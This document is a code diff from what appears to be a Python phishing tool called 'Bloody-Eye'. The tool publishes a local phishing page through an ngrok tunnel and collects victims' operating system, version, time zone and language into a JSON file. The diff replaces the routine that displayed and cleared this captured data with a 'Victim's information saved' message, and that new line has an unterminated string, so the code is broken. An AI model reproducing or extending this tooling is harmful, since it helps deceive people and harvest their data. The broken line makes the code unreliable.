@@ -549,7 +549,7 @@ exit();""")
        global token
        a = ngrok.connect(6060,"http",auth_token=token)
        print("\n"+Fore.RED+" [~] URL 1 : "+Fore.BLUE+str(a).replace('"','').replace("NgrokTunnel:","").replace("http://","https://").replace("-> https://localhost:6060",""))
-       print("\n"+Fore.RED+" [~] URL 2 : "+Fore.BLUE+str(a).replace('"','').replace("NgrokTunnel:","").replace("http://","https://").replace("-> https://localhost:6060",""))
+       print("\n"+Fore.RED+" [~] URL 2 : "+Fore.BLUE+str(a).replace('"','').replace("NgrokTunnel:","").replace("-> https://localhost:6060",""))
     v = input(Fore.RED+" ["+Fore.WHITE+"~"+Fore.RED+Fore.RED+"]"+Fore.CYAN+" Select a Port Forwarding Service : ")
     if v == "01":
       phpserver()
@@ -601,24 +601,11 @@ exit();""")
             global stat_file
             if not str(os.stat('../Bloody-Eye/templates/phishing/info.json').st_size) == stat_file:
                 stat_file = str(os.stat('../Bloody-Eye/templates/phishing/info.json').st_size)
-                fileip = open("../Bloody-Eye/templates/phishing/info.json","r")
-                b = fileip.read()
-            try:
-                infor = json.loads(b)
-                for value in infor['dev']:
-                    print("\n"+Fore.RED+" ["+Fore.WHITE+"~"+Fore.RED+"]"+Fore.BLUE+" Os Name : "+Fore.WHITE+value['Os-Name'])
-                    print("\n"+Fore.RED+" ["+Fore.WHITE+"~"+Fore.RED+"]"+Fore.BLUE+" Os Version : "+Fore.WHITE+value['Os-Version'])
-                    print("\n"+Fore.RED+" ["+Fore.WHITE+"~"+Fore.RED+"]"+Fore.BLUE+" Time Zone : "+Fore.WHITE+value['Time-Zone'])
-                    print("\n"+Fore.RED+" ["+Fore.WHITE+"~"+Fore.RED+"]"+Fore.BLUE+" Os Version : "+Fore.WHITE+value['Language'])
-                    a = open("../Bloody-Eye/templates/phishing/info.json","w")
-                    b = a.write("")
-                    a.close()
-            except:
-                None
+                print(Fore.RED+" [~] Victim's information saved in [info.json])
     while True:
+        info()
         userin()
         readip()
-        info()
   except:
     with open("exit","w") as kill:
       Popen(("taskkill","/F","/IM","php*"),stderr=kill,stdout=kill)
